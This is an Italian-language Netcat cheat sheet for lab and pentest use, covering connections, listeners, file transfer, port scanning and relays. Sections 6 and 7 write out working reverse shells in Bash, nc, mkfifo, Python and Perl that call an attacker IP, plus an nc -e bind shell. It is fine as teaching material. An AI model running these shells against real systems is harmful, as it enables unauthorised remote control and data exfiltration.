# Netcat — Guida ai Principali Comandi e Test

> **Avviso legale:** Netcat è uno strumento di rete versatile. Utilizzarlo esclusivamente su sistemi di cui si possiede l'autorizzazione esplicita. L'uso non autorizzato è illegale.

---

## 1. Installazione

### Su Kali Linux (già incluso)
```bash
nc --version
```

### Installazione manuale
```bash
apt update && apt install -y netcat-traditional
# oppure versione OpenBSD
apt install -y netcat-openbsd
```

---

## 2. Sintassi generale

```
nc [opzioni] <host> <porta>      # client
nc [opzioni] -l -p <porta>       # server (listener)
```

---

## 3. Connessione a un servizio

### Connessione TCP a un host e porta
```bash
nc 192.168.1.1 80
```

### Connessione UDP
```bash
nc -u 192.168.1.1 53
```

### Connessione con timeout (es. 5 secondi)
```bash
nc -w 5 192.168.1.1 80
```

### Banner grabbing (identificare il servizio)
```bash
echo "" | nc -w 1 192.168.1.1 22
echo "" | nc -w 1 192.168.1.1 80
```

### Richiesta HTTP manuale
```bash
echo -e "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80
```

---

## 4. Listener (modalità server)

### Aprire un listener TCP sulla porta 4444
```bash
nc -lvp 4444
```

### Aprire un listener UDP
```bash
nc -lvup 4444
```

| Flag | Significato                  |
|------|------------------------------|
| `-l` | Modalità listen (server)     |
| `-v` | Verbose                      |
| `-p` | Porta da usare               |
| `-u` | Protocollo UDP               |

---

## 5. Trasferimento file

### Lato ricevente (listener)
```bash
nc -lvp 4444 > file-ricevuto.txt
```

### Lato mittente (client)
```bash
nc 192.168.1.1 4444 < file-da-inviare.txt
```

### Trasferire una directory compressa
```bash
# Ricevente
nc -lvp 4444 | tar xzvf -

# Mittente
tar czvf - /cartella | nc 192.168.1.2 4444
```

---

## 6. Shell inverse (Reverse Shell)

Una reverse shell permette al target di connettersi all'attaccante.

### Listener sull'attaccante
```bash
nc -lvp 4444
```

### Reverse shell Bash (da eseguire sul target)
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

### Reverse shell con Netcat (se il target ha nc)
```bash
nc -e /bin/bash 192.168.1.100 4444
```

### Reverse shell con Netcat (versione senza -e)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

### Reverse shell Python
```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("192.168.1.100",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

### Reverse shell Perl
```bash
perl -e 'use Socket; $i="192.168.1.100"; $p=4444; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); connect(S,sockaddr_in($p,inet_aton($i))); open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/bash -i");'
```

---

## 7. Bind Shell

Una bind shell apre una porta sul target in attesa di connessione.

### Sul target (apre la shell sulla porta 4444)
```bash
nc -lvp 4444 -e /bin/bash
```

### L'attaccante si connette
```bash
nc 192.168.1.1 4444
```

---

## 8. Port scanning con Netcat

### Scan di una singola porta
```bash
nc -zv 192.168.1.1 80
```

### Scan di un range di porte
```bash
nc -zv 192.168.1.1 1-1000
```

### Scan UDP
```bash
nc -zuv 192.168.1.1 1-100
```

| Flag | Significato                        |
|------|------------------------------------|
| `-z` | Zero I/O mode (solo scan, no dati) |
| `-v` | Verbose (mostra risultato)         |

---

## 9. Chat e relay

### Chat bidirezionale tra due macchine

**Macchina A (listener):**
```bash
nc -lvp 4444
```

**Macchina B (client):**
```bash
nc 192.168.1.1 4444
```

### Relay/proxy tra due host
```bash
# Tutto il traffico sulla porta 4444 viene inoltrato a 192.168.1.2:80
nc -lvp 4444 | nc 192.168.1.2 80
```

---

## 10. Esempi completi per lab

### Banner grabbing multi-porta
```bash
for porta in 21 22 23 25 80 443 3306; do
  echo "--- Porta $porta ---"
  echo "" | nc -w 2 -v 192.168.1.1 $porta 2>&1
done
```

### Trasferire un file binario (es. eseguibile)
```bash
# Ricevente
nc -lvp 5555 > tool.exe

# Mittente
nc 192.168.1.100 5555 < tool.exe
```

### Listener con output su file di log
```bash
nc -lvp 4444 | tee sessione.log
```
